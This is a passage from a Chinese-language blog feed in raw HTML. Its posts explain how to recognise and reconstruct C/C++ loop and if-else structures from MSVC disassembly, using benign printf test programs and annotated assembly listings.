__cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    1</span><br><span class="line">.text:00401042                 push    offset _Format  ; &quot;%d&quot;</span><br><span class="line">.text:00401047                 call    _printf</span><br><span class="line">.text:0040104C                 add     esp, 8</span><br><span class="line">.text:0040104F                 xor     eax, eax</span><br><span class="line">.text:00401051                 retn</span><br><span class="line">.text:00401051 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，编译器并没有生成循环代码。因为编译器在编译阶段判断出了这个循环只需要执行一次，故可以将循环体内部的代码外提，然后省略掉不必要的循环。</p><h2 id="关键字continue和break的还原方法总结">关键字<code>continue</code>和<code>break</code>的还原方法总结</h2><p>根据上述分析，如果一个条件跳转跳转到了循环体的外部，则它就是<code>break</code>；如果一个条件跳转跳转到了循环体的循环起始位置，则它就是<code>continue</code>。</p><h1>总的优化原则</h1><p>对于循环结构来说，最好是能尽量不打断流水线优化。所以常见的对于循环优化的方法有：</p><ul><li><p>强度削弱，用指令周期少指令代替指令周期多的指令</p></li><li><p>减少分支，能优化成<code>do...while</code>就优化成<code>do...while</code>的形式</p></li><li><p>代码外提</p></li></ul><p>对于强度削弱不需要解释，那么为什么要能优化成<code>do...while</code>的循环就优化成<code>do...while</code>的形式呢？由于<code>do...while</code>的特征是<strong>先执行一次循环体内的代码后，再进行判断</strong>，它与汇编上条件跳转成立的条件逻辑上是一致的，且根据上面分析，它只有一处向上的跳转，能够减少分支，这样就可以尽量少的影响到流水线优化，提高程序的执行效率。</p><p>而对于代码外提其实是有条件的，对于循环条件的检查部分，不能是循环体内被修改的值，只有满足这个条件的时候才会被外提。即：当比较的是固定值时，编译器就会将其自动代码外提；但是当它是一个黑盒的时候，就不能做到自动的代码外提了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;循环结构是程序设计的三大结构之一，搞清楚它在反汇编下的代码特征对于逆向工程来说是非常重要的。对于&lt;code&gt;C/C++&lt;/code&gt;来说，循环结构常见的有三种类型：&lt;code&gt;for&lt;/code&gt;，&lt;code&gt;while&lt;/code&gt;和&lt;code&gt;do...while&lt;/c</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="循环结构" scheme="https://4st.tech/tags/%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/"/>
    
    <category term="for" scheme="https://4st.tech/tags/for/"/>
    
    <category term="while" scheme="https://4st.tech/tags/while/"/>
    
    <category term="do...while" scheme="https://4st.tech/tags/do-while/"/>
    
    <category term="continue" scheme="https://4st.tech/tags/continue/"/>
    
    <category term="break" scheme="https://4st.tech/tags/break/"/>
    
  </entry>
  
  <entry>
    <title>C++逆向：选择结构的分析、识别与还原</title>
    <link href="https://4st.tech/2021/08/31/c-ni-xiang-xuan-ze-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/08/31/c-ni-xiang-xuan-ze-jie-gou-de-fen-xi-shi-bie-yu-huan-yuan/</id>
    <published>2021-08-31T03:12:59.000Z</published>
    <updated>2021-09-01T05:08:01.865Z</updated>
    
    <content type="html"><![CDATA[<p>结构化程序设计的三大结构，分别是：<strong>顺序结构、选择结构和循环结构</strong>。这三种基本结构可以任意组合，形成多姿多彩的程序世界。在这其中的顺序结构是按照代码编写的顺序逐步执行；而选择结构打断了这种顺序，让程序支持了逻辑条件。因此，可以识别与还原选择结构对于C/C++逆向工程是非常重要的。本文只进行识别和还原<code>if-else</code>结构，而<code>switch-case</code>结构已经阐述完毕，本文不再进行赘述。<strong>实验环境采用的是<code>VS2019</code>的<code>MSVC</code>和<code>VC6</code>的<code>MSVC</code>进行编译，优化选项为速度最快优化</strong>。</p><p>…</p><h1 id="条件转移的分类"><a href="#条件转移的分类" class="headerlink" title="条件转移的分类"></a>条件转移的分类</h1><p>条件转移指令大致上分为三类：</p><ul><li><code>if-else</code>结构</li><li><code>switch-case</code>结构</li><li>三目运算</li></ul><p>其中：<code>switch-case</code>的优化策略较多，因此对于它在反汇编中的识别和还原另开辟了一篇文章进行了讨论与分析。本文注重分析<code>if-else</code>分支结构的分析与还原以及对三目运算的简要分析，在分析时需要注意各种优化策略（如：传播、折叠、公共表达式等）优化策略对分析的影响。</p><h1 id="各类选择结构的分析"><a href="#各类选择结构的分析" class="headerlink" title="各类选择结构的分析"></a>各类选择结构的分析</h1><h2 id="if-else单分支结构的分析"><a href="#if-else单分支结构的分析" class="headerlink" title="if...else单分支结构的分析"></a><code>if...else</code>单分支结构的分析</h2><h3 id="常量做判断条件"><a href="#常量做判断条件" class="headerlink" title="常量做判断条件"></a>常量做判断条件</h3><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;constant\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  4</span><br><span class="line">.text:00401040 argv            = dword ptr  8</span><br><span class="line">.text:00401040 envp            = dword ptr  0Ch</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    offset Format   ; &quot;constant\n&quot;</span><br><span class="line">.text:00401045                 call    sub_401010</span><br><span class="line">.text:0040104A                 add     esp, 4</span><br><span class="line">.text:0040104D                 xor     eax, eax</span><br><span class="line">.text:0040104F                 retn</span><br><span class="line">.text:0040104F _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，没有生成任何的条件转移指令。为什么呢？因为编译器在编译过程中就可以确定执行的是哪一个分支，故编译器在编译阶段就将其优化掉了，不会产生任何的条件转移指令。对于这样的代码，在底层是还原不出来上述测试代码的，但是可以还原出其等价代码。</p><h3 id="if单分支结构"><a href="#if单分支结构" class="headerlink" title="if单分支结构"></a><code>if</code>单分支结构</h3><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argc &gt; 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编的完整结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp             ; ArgList</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 cmp     [ebp+argc], 2</span><br><span class="line">.text:00401047                 jle     short IF_END</span><br><span class="line">.text:00401049                 push    offset Format   ; &quot;argc &gt; 2\n&quot;</span><br><span class="line">.text:0040104E                 call    sub_401010</span><br><span class="line">.text:00401053                 add     esp, 4</span><br><span class="line">.text:00401056</span><br><span class="line">.text:00401056 IF_END:                                 ; CODE XREF: _main+7↑j</span><br><span class="line">.text:00401056                 xor     eax, eax</span><br><span class="line">.text:00401058                 pop     ebp</span><br><span class="line">.text:00401059                 retn</span><br><span class="line">.text:00401059 _main           endp</span><br></pre></td></tr></table></figure><p>经过整理可以发现，其产生了一条条件转移指令<code>jle short IF_END</code>。但是好像与我们源代码中写的条件<code>argc &gt; 2</code>是不同的，为什么是这样的？编译器生成的汇编代码还是正确的吗？答案是生成的汇编代码是正确的。原因是对于高级代码（如C语言的代码）而言，如果条件成立则执行条件体内部的代码；而对于汇编指令来说，如果条件成立则跳转成立，就会将执行流程转移了。所以在生成汇编代码的时候，需要对原条件进行取反，才能保证其逻辑上与高级代码的逻辑是一致的，即：条件成立，执行条件体内的代码。</p><p>根据上述特点，可以总结单分支转移结构的特点：</p><ul><li>有一条<code>jcc</code>指令</li><li><code>jcc</code>指令后面会紧跟一个标号</li><li>标号上面没有其他的跳转</li><li>这个跳转跳过一段代码</li></ul><p>根据这些特点就可以将单分支结构给识别出来了，还原时，只需要将<code>jcc</code>指令和标号中间的代码还原到条件体内部，而判断条件为<code>jcc</code>指令条件取反即可还原。</p><h3 id="if-else结构"><a href="#if-else结构" class="headerlink" title="if...else结构"></a><code>if...else</code>结构</h3><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argc &gt; 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VS2019</code>的反汇编结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 cmp     [ebp+argc], 2</span><br><span class="line">.text:00401047                 mov     ecx, offset _Format ; &quot;argc &gt; 2\n&quot;</span><br><span class="line">.text:0040104C                 mov     eax, offset aDefault ; &quot;default\n&quot;</span><br><span class="line">.text:00401051                 cmovg   eax, ecx</span><br><span class="line">.text:00401054                 push    eax             ; _Format</span><br><span class="line">.text:00401055                 call    _printf</span><br><span class="line">.text:0040105A                 add     esp, 4</span><br><span class="line">.text:0040105D                 xor     eax, eax</span><br><span class="line">.text:0040105F                 pop     ebp</span><br><span class="line">.text:00401060                 retn</span><br><span class="line">.text:00401060 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现没有使用<code>jcc</code>指令，而是使用了新的指令<code>cmovg</code> ，它们是一系列的条件赋值指令，指令功能为：当条件成立时，则执行赋值操作。对于本例来说，其优化后的反汇编代码还原后为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *str = <span class="string">&quot;default\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        str = <span class="string">&quot;argc &gt; 2\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即：编译器首先假设是<code>default</code>的情况，然后再进行判断其是否大于2，编译器这么做是与源代码等价的。</p><p><code>MSVC</code>的高版本编译器使用了条件赋值指令来实现了无分支的操作，那么在不支持条件赋值指令的CPU上是如何操作的呢？现在用<code>VC6</code>的<code>MSVC</code>进行编译测试一下（因为<code>VC6</code>的那个年代，没有这条指令，所以可以观察<code>VC6</code>下的编译结果），观察其反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 cmp     [esp+arg_0], 2</span><br><span class="line">.text:00401005                 jle     short ELSE_BEGIN</span><br><span class="line">.text:00401005</span><br><span class="line">.text:00401007                 push    offset s-&gt;Argc&gt;2 ; &quot;argc &gt; 2\n&quot;</span><br><span class="line">.text:0040100C                 call    printf</span><br><span class="line">.text:0040100C</span><br><span class="line">.text:00401011                 add     esp, 4</span><br><span class="line">.text:00401014                 xor     eax, eax</span><br><span class="line">.text:00401016                 retn</span><br><span class="line">.text:00401016</span><br><span class="line">.text:00401017 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401017</span><br><span class="line">.text:00401017 ELSE_BEGIN:                             ; CODE XREF: _main+5j</span><br><span class="line">.text:00401017                 push    offset s-&gt;Default ; &quot;default\n&quot;</span><br><span class="line">.text:0040101C                 call    printf</span><br><span class="line">.text:0040101C</span><br><span class="line">.text:00401021                 add     esp, 4</span><br><span class="line">.text:00401024</span><br><span class="line">.text:00401024 ELSE_END:</span><br><span class="line">.text:00401024                 xor     eax, eax</span><br><span class="line">.text:00401026                 retn</span><br><span class="line">.text:00401026</span><br><span class="line">.text:00401026 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，其还是使用的条件转移指令进行实现的。由于采用的是速度最快的优化，其优化方式如图所示：</p><p><img src="https://raw.githubusercontent.com/m-Onst/pics/main/blog/202108/%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84%E4%BC%98%E5%8C%96.png" alt=""></p><p>所以没有使用无条件跳转转移指令来连接公共的代码块，而是利用公共表达式优化，将公共代码块复制一份，抵消了一次跳转，从而没有打断CPU的流水线优化，提高了运行速度。</p><p><code>if...else</code>的代码特征：</p><ul><li>有多个<code>jcc</code>指令，每个<code>jcc</code>指令后都有一个标号</li><li>标号之间为各个条件块内的代码</li></ul><p>而对于还原方法，其还原的方法与<code>if</code>单分支结构的还原方法一致。</p><h2 id="if-else-if多分支结构的分析"><a href="#if-else-if多分支结构的分析" class="headerlink" title="if...else if多分支结构的分析"></a><code>if...else if</code>多分支结构的分析</h2><h3 id="if-else-if结构"><a href="#if-else-if结构" class="headerlink" title="if...else if结构"></a><code>if...else if</code>结构</h3><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argc &gt; 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;argc &lt; 4\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VS2019</code>版本的完整的反汇编结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 cmp     [ebp+argc], 2</span><br><span class="line">.text:00401047                 mov     ecx, offset _Format ; &quot;argc &gt; 2\n&quot;</span><br><span class="line">.text:0040104C                 mov     eax, offset aArgc4 ; &quot;argc &lt; 4\n&quot;</span><br><span class="line">.text:00401051                 cmovg   eax, ecx</span><br><span class="line">.text:00401054                 push    eax             ; _Format</span><br><span class="line">.text:00401055                 call    _printf</span><br><span class="line">.text:0040105A                 add     esp, 4</span><br><span class="line">.text:0040105D                 xor     eax, eax</span><br><span class="line">.text:0040105F                 pop     ebp</span><br><span class="line">.text:00401060                 retn</span><br><span class="line">.text:00401060 _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，其也是使用的<code>comvg</code>来实现的无分支转移。对于低版本的编译器，如<code>VC6</code>的<code>MSVC</code>的情况，反汇编结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cmp     eax, 2</span><br><span class="line">.text:00401007                 jle     short ELSE_IF</span><br><span class="line">.text:00401007</span><br><span class="line">.text:00401009                 push    offset s-&gt;Argc&gt;2 ; &quot;argc &gt; 2\n&quot;</span><br><span class="line">.text:0040100E                 call    printf</span><br><span class="line">.text:0040100E</span><br><span class="line">.text:00401013                 add     esp, 4</span><br><span class="line">.text:00401016                 xor     eax, eax</span><br><span class="line">.text:00401018                 retn</span><br><span class="line">.text:00401018</span><br><span class="line">.text:00401019 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401019</span><br><span class="line">.text:00401019 ELSE_IF:                                ; CODE XREF: _main+7j</span><br><span class="line">.text:00401019                 cmp     eax, 4</span><br><span class="line">.text:0040101C                 jge     short EXIT_PROGRAM</span><br><span class="line">.text:0040101C</span><br><span class="line">.text:0040101E                 push    offset s-&gt;Argc&lt;4 ; &quot;argc &lt; 4\n&quot;</span><br><span class="line">.text:00401023                 call    printf</span><br><span class="line">.text:00401023</span><br><span class="line">.text:00401028                 add     esp, 4</span><br><span class="line">.text:00401028</span><br><span class="line">.text:0040102B</span><br><span class="line">.text:0040102B EXIT_PROGRAM:                           ; CODE XREF: _main+1Cj</span><br><span class="line">.text:0040102B                 xor     eax, eax</span><br><span class="line">.text:0040102D                 retn</span><br><span class="line">.text:0040102D</span><br><span class="line">.text:0040102D _main           endp</span><br></pre></td></tr></table></figure><p>使用的还是公共代码块提取出来，以减少一次跳转，提高运行速度。</p><h3 id="if-else-if-else结构"><a href="#if-else-if-else结构" class="headerlink" title="if...else if...else结构"></a><code>if...else if...else</code>结构</h3><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">if (argc &gt; 2) &#123;</span><br><span class="line">printf(&quot;argc &gt; 2\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else if (argc &lt; 0) &#123;</span><br><span class="line">printf(&quot;argc &lt; 0\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">printf(&quot;argc &gt;= 0 and argc &lt;= 2\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VS2019</code>的<code>MSVC</code>的反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh+F5↓p</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040 argc            = dword ptr  8</span><br><span class="line">.text:00401040 argv            = dword ptr  0Ch</span><br><span class="line">.text:00401040 envp            = dword ptr  10h</span><br><span class="line">.text:00401040</span><br><span class="line">.text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 mov     ecx, [ebp+argc]</span><br><span class="line">.text:00401046                 cmp     ecx, 2</span><br><span class="line">.text:00401049                 jle     short ELSE_IF</span><br><span class="line">.text:0040104B                 mov     eax, offset _Format ; &quot;argc &gt; 2\n&quot;</span><br><span class="line">.text:00401050                 push    eax             ; _Format</span><br><span class="line">.text:00401051                 call    _printf</span><br><span class="line">.text:00401056                 add     esp, 4</span><br><span class="line">.text:00401059                 xor     eax, eax</span><br><span class="line">.text:0040105B                 pop     ebp</span><br><span class="line">.text:0040105C                 retn</span><br><span class="line">.text:0040105D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040105D</span><br><span class="line">.text:0040105D ELSE_IF:                                ; CODE XREF: _main+9↑j</span><br><span class="line">.text:0040105D                 test    ecx, ecx</span><br><span class="line">.text:0040105F                 mov     edx, offset aArgc0AndArgc2 ; &quot;argc &gt;= 0 and argc &lt;= 2\n&quot;</span><br><span class="line">.text:00401064                 mov     eax, offset aArgc0 ; &quot;argc &lt; 0\n&quot;</span><br><span class="line">.text:00401069                 cmovns  eax, edx</span><br><span class="line">.text:0040106C                 push    eax             ; _Format</span><br><span class="line">.text:0040106D                 call    _printf</span><br><span class="line">.text:00401072                 add     esp, 4</span><br><span class="line">.text:00401075                 xor     eax, eax</span><br><span class="line">.text:00401077                 pop     ebp</span><br><span class="line">.text:00401078                 retn</span><br><span class="line">.text:00401078 _main           endp</span><br><span class="line">.text:00401078</span><br></pre></td></tr></table></figure><p>其首先判断是否是大于2的，如果不是再使用条件赋值语句来减少一次跳转。对于其高版本的还原是比较好做等价代码的还原的。对于低版本的<code>MSVC</code>的反汇编结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cmp     eax, 2</span><br><span class="line">.text:00401007                 jle     short ELSE_IF</span><br><span class="line">.text:00401007</span><br><span class="line">.text:00401009                 push    offset s-&gt;Argc&gt;2 ; &quot;argc &gt; 2\n&quot;</span><br><span class="line">.text:0040100E                 call    